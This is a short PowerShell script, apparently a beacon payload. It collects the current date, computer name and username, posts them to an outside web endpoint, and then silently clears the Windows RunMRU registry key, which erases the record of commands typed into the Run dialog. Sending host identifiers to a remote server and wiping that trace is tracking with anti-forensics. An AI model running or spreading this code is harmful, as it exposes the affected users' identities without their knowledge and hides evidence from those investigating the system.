try {
    $data = [PSCustomObject]@{
        Date     = Get-Date
        Computer = $env:COMPUTERNAME
        User     = $env:USERNAME
    }

    $body = [PSCustomObject]@{
        Name = $data
    }

    Invoke-WebRequest -Method Post -Uri "http://pjx.azurewebsites.net/api/pjx" -Body ($body | ConvertTo-Json)
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
}
catch {
    $_ | Out-File "$($PSScriptRoot)\..\Errors\errors.log"
}
